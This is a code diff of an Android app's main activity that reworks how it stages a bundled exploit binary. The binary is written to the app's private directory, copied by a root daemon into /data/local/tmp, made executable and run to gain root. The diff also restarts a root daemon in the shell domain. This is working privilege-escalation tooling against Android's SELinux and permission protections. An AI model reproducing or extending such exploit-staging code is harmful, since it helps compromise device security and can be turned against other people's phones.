@@ -582,36 +582,52 @@ public class MainActivity extends Activity {
     // ------------------------------------------------------- auto escalation
 
     /** Copy the bundled exploit out of assets and make it executable. */
+    /** Make the exploit runnable at PAYLOAD.
+     *
+     *  The app cannot write /data/local/tmp (771 + SELinux), so the bytes are
+     *  written to the app's private dir first — that always works — and then
+     *  the root daemon (running as root) copies them into place. If no daemon
+     *  exists yet, the caller falls back to shipping them over adb shell. */
     private boolean stagePayload() {
-        File f = new File(PAYLOAD);
-        if (f.exists() && f.length() > 10000) {
-            // already staged (e.g. pushed over adb); the daemon runs it, so the
-            // app itself never needs exec permission on it
-            return true;
-        }
-        AssetManager am = getAssets();
-        InputStream in = null;
-        FileOutputStream out = null;
-        try {
-            in = am.open("exploit.bin");
-            out = new FileOutputStream(f);
-            byte[] buf = new byte[65536];
-            int n;
-            while ((n = in.read(buf)) > 0) {
-                out.write(buf, 0, n);
+        File priv = new File(getFilesDir(), "exploit.bin");
+        if (!priv.exists() || priv.length() < 10000) {
+            AssetManager am = getAssets();
+            InputStream in = null;
+            FileOutputStream out = null;
+            try {
+                in = am.open("exploit.bin");
+                out = new FileOutputStream(priv);
+                byte[] buf = new byte[65536];
+                int n;
+                while ((n = in.read(buf)) > 0) {
+                    out.write(buf, 0, n);
+                }
+                out.flush();
+                out.getFD().sync();
+            } catch (Exception e) {
+                logPost("释放载荷到私有目录失败: " + e.getMessage() + "\n");
+                return false;
+            } finally {
+                try { if (in != null) in.close(); } catch (Exception ignored) { }
+                try { if (out != null) out.close(); } catch (Exception ignored) { }
             }
-            out.flush();
-            out.getFD().sync();
-            f.setReadable(true, false);
-            f.setExecutable(true, false);
-            return true;
-        } catch (Exception e) {
-            logPost("释放载荷失败: " + e.getMessage() + "\n");
-            return false;
-        } finally {
-            try { if (in != null) in.close(); } catch (Exception ignored) { }
-            try { if (out != null) out.close(); } catch (Exception ignored) { }
         }
+
+        File target = new File(PAYLOAD);
+        if (target.exists() && target.length() == priv.length()) {
+            return true; // already in place
+        }
+        if (!daemonAlive()) {
+            return false; // no daemon: caller ships it over adb shell
+        }
+        String r = execRoot("cp '" + priv.getAbsolutePath() + "' " + PAYLOAD + " 2>&1; "
+                + "chmod 755 " + PAYLOAD + " 2>&1; ls -l " + PAYLOAD);
+        if (r != null && r.contains("o1p_e.bin")) {
+            logPost("载荷已由 rootd 放入 " + PAYLOAD + "\n");
+            return true;
+        }
+        logPost("rootd 复制载荷失败: " + r + "\n");
+        return false;
     }
 
     private void autoRoot() {
@@ -714,10 +730,11 @@ public class MainActivity extends Activity {
         log("\n=== 重跑载荷（不再配对）===\n");
         new Thread(new Runnable() {
             public void run() {
-                String payload = stagePayload2();
-                if (payload == null) {
-                    logPost("载荷释放失败\n");
-                    return;
+                String payload = PAYLOAD;
+                if (!stagePayload()) {
+                    // the app cannot write /data/local/tmp (771 + SELinux); the
+                    // daemon/runOnly path ships it over the adb shell channel
+                    logPost("本地无法写入，改由 shell 通道传输载荷\n");
                 }
                 String cmd = "/system/bin/chmod 755 " + payload + "; "
                         + payload + " 10000 14000 300 1 12 1 8000 800 2>&1; "
@@ -746,11 +763,10 @@ public class MainActivity extends Activity {
                     // stop a leftover daemon (e.g. restricted app-domain one) so
                     // the shell-domain daemon can bind the socket
                     try { execRoot("__stop"); } catch (Throwable ignored) { }
-                    String payload = stagePayload2();
-                    if (payload == null) {
-                        logPost("载荷释放失败\n");
-                        return;
+                    if (!stagePayload()) {
+                        logPost("本地无法写入，改由 shell 通道传输载荷\n");
                     }
+                    String payload = PAYLOAD;
                     String chmod = "/system/bin/chmod 755 " + payload + "; ";
                     String pkg = getPackageName();
                     // run the exploit, then let the freshly started root daemon
